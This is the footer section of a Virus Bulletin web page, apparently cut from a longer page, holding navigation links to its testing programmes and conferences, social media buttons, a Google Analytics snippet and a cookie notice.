<p><a title="Newsletter" href="/newsletter/">Virus Bulletin newsletter</a></p> </div>
<div class="col-md-3">
<p><a title="VB Testing" href="/testing/">Testing</a></p>
<p><a title="VB100" href="/testing/vb1001/">VB100</a></p>
<p><a title="VBSpam" href="/testing/vbspam/">VBSpam</a></p>
<p><a title="VBWeb" href="/testing/vbweb/">VBWeb</a></p>
<p><a title="Consultancy Services" href="/testing/consultancy-services/">Consultancy services</a></p>
<p><a title="The Spammers' Compendium" href="/resources/spammerscompendium/">Spammers' Compendium</a></p> </div>
<div class="col-md-3">
<p><a title="VB2021 localhost" href="/conference/vb2021/">VB2021 localhost</a></p>
<p><a title="VB2020 localhost" href="/conference/vb2020/">VB2020 localhost</a></p>
<p><a title="VB2019" href="/conference/vb2019/">VB2019 (London)</a></p>
<p><a title="VB2018" href="/conference/vb2018">VB2018 (Montreal)</a></p>
<p><a title="VB2017" href="/conference/vb2017">VB2017 (Madrid)</a></p>
<p><a title="Conference Archive" href="/conference/vb-conference-archive/">Older conferences</a></p> </div>
<div class="col-md-3">
<div class="row">
<table style="float: right;" border="0">
<tbody>
<tr>
<td align="center"><a href="/rss" target="_blank"><img title="Get our blog updates" src="/uploads/images/buttons/rss-square-gray.png" alt="rss.png" width="35" height="35" /></a></td>
<td> </td>
<td align="center"><a href="https://twitter.com/virusbtn" target="_blank"><img class="bhtmbxoyxwpzahwcvxnw" title="Visit us on Twitter" src="/uploads/images/buttons/twitter-square-gray.png" alt="twitter.png" width="35" height="35" /></a></td>
<td> </td>
<td align="center"><a href="https://www.linkedin.com/company/virus-bulletin" target="_blank"><img class="bhtmbxoyxwpzahwcvxnw" title="Visit us on LinkedIn" src="/uploads/images/buttons/linkedin-square-gray.png" alt="linkedin.png" width="35" height="35" /></a></td>
<td> </td>
<td align="center"><a href="https://www.facebook.com/virusbulletin" target="_blank"><img title="Visit us on Facebook" src="/uploads/images/buttons/fb-square-gray.png" alt="twitter.png" width="35" height="35" /></a></td>
<td> </td>
<td align="center"><a href="https://www.youtube.com/user/virusbtn" target="_blank"><img title="Visit us on Youtube" src="/uploads/images/buttons/youtube-square-gray.png" alt="youtube.png" width="35" height="35" /></a></td>
</tr>
</tbody>
</table>
</div> </div>
</div>
<div class="row ">
<div class="col-md-12">
</div>
</div>
</div>
</div>
</footer>

<footer class="bs-footer2" role="contentinfo">
<div class="container">
<div class="bs-social2">
<div class="row ">
<div class="col-md-3">
</div>
<div class="col-md-3">
</div>
<div class="col-md-3">
</div>
<div class="col-md-3">
</div>
</div>
<div class="row ">
<div class="col-md-12">
<p style="text-align: left;">©1989-2022 Virus Bulletin.        <a title="Privacy Policy" href="/about-vb/privacy-policy/">Privacy policy</a>        <a title="Cookies" href="/about-vb/privacy-policy/cookies/">Cookies</a>        <a title="Terms and Conditions" href="/about-vb/terms-and-conditions/">Terms and Conditions</a></p> </div>
</div>
</div>
</div>
</footer>

<script async src="https://www.googletagmanager.com/gtag/js?id=UA-21876594-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-21876594-2', { 'anonymize_ip': true });
</script><script type="text/javascript" src="/libraries/js/fancybox.load.js"></script>
<script type="text/javascript" src="/packages/bootstrap/js/common/app.js"></script>
<div id="ccm-cookiesDisclosure" class="disclosure-bottom">
<div class="disclosure-container">
<div class="disclosure-content">
<p> We have placed cookies on your device in order to improve the functionality of this site, as outlined in our <a href="/about-vb/privacy-policy/cookies" target="_blank">cookies policy</a>. However, you may delete and block all cookies from this site and your use of the site will be unaffected. By continuing to browse this site, you are agreeing to Virus Bulletin's use of data as outlined in our <a href="/about-vb/privacy-policy/" target="_blank">privacy policy</a>.</p>
</div>
<div class="disclosure-form">
<form action="/index.php/cookies_disclosure/" method="POST">
<input type="hidden" name="allowCookies" value="1" />
<div class="button">
<input class="btn btn-info btn-sm" type="submit" name="submit" value="I understand. Don't show this message again!" />
</div>
</form>
</div>
<div class="ccm-spacer">&nbsp;</div>
</div>
</div>
</body>
</html>